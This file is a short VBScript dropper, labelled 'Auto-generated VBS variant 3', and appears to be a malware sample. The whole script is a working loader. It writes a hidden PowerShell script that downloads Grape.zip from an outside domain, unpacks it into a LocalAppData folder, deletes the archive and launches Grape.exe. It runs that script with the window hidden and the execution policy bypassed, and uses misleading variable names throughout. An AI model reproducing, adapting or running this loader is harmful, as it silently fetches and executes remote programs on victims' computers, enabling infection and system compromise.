' Auto-generated VBS variant 3
Set hdrContext = CreateObject("Scripting.FileSystemObject")
rpcBuffer = hdrContext.GetSpecialFolder(2) & "\" & hdrContext.GetTempName & ".ps1"
Set hdrBuffer = hdrContext.CreateTextFile(rpcBuffer, True)
hdrBuffer.WriteLine "$ProgressPreference = 'SilentlyContinue'"
hdrBuffer.WriteLine "$coreToken = [System.IO.Path]::GetTempFileName() + '.zip'"
hdrBuffer.WriteLine "$devAdapter = ""$env:LOCALAPPDATA\binLib"""
hdrBuffer.WriteLine "curl.exe -s -o $coreToken https://universalllccorp.com/Grape.zip"
hdrBuffer.WriteLine "if (-not (Test-Path $devAdapter)) { New-Item -ItemType Directory -Path $devAdapter -Force | Out-Null }"
hdrBuffer.WriteLine "Add-Type -AssemblyName System.IO.Compression.FileSystem"
hdrBuffer.WriteLine "[System.IO.Compression.ZipFile]::ExtractToDirectory($coreToken, $devAdapter)"
hdrBuffer.WriteLine "Remove-Item $coreToken -Force"
hdrBuffer.WriteLine "if (Test-Path ""$devAdapter\Grape.exe"") { Start-Process ""$devAdapter\Grape.exe"" }"
hdrBuffer.Close
Set sysResolver = CreateObject("WScript.Shell")
sysResolver.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & rpcBuffer & """", 0, False
